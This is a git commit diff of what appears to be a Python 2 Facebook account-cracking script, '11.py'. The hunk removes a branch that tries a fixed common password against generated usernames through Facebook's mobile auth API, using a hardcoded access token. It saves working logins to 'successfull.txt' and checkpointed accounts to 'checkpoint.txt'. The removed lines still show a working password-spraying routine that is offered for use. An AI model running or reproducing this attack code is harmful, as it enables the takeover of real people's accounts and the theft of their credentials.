60c19d9bb724f63d7d60e7a23e78714ab891c17a
Babar Ali <62939512+hearthackerBabar@users.noreply.github.com>
2020-07-28 09:51:12 +0500

    Update 11.py

--- 11.py
+++ 11.py
@@ -4103,23 +4103,6 @@ def action():
  					                cps.write(k+c+user+'-•◈•-'+pass3+'\n')
  					                cps.close()
  					                cpb.append(c+user+pass3)
-                                                else:
- 				                    pass4="Pakistan786"
- 				                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
- 				                    q = json.load(data)
- 				                    if 'access_token' in q:
- 				                        print '\x1b[1;92m{Hack}  ' + k + c + user + '  》  ' + pass4+'\n'+"\n"
- 				                        okb = open('save/successfull.txt', 'a')
- 				                        okb.write(k+c+user+'-•◈•-'+pass4+'\n')
- 				                        okb.close()
- 				                        oks.append(c+user+pass4)
- 				               else:
- 				                   if 'www.facebook.com' in q['error_msg']:
- 					                        print '\033[1;96m[Error] ' + k + c + user + '  》  ' + pass4+'\n'
- 					                        cps = open('save/checkpoint.txt', 'a')
- 					                        cps.write(k+c+user+'-•◈•-'+pass4+'\n')
- 					                        cps.close()
- 					                        cpb.append(c+user+pass4)
 																	
 															
 		except:
